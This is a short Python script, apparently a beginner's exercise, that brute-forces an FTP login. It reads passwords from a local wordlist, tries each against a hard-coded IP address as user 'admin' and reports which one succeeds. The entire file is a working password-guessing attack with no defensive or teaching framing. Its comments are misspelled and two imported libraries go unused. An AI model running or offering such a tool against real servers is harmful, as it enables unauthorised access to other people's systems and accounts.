import ftplib
import termcolor
import pyfiglet

intr= input("[!] ~ Go in The script => ")
host = "161.145.1.1 "
user = "admin"
#file = open("ftp.txt")
psw = open ('/Users/BAWAR CENTER/Documents/web.html/.vscode/ftp.txt')
# raed file whine we Mike /
psw = psw.read()
psw = psw.splitlines()

for one in psw:

    try:
    # try Fore any error !
        ftp = ftplib.FTP(host , user , one)
        print(one , "is correct <== ")
    # You can mike Nother massege /
    except:
        print(one , "is incorrect. . . . .")    
#########################################################
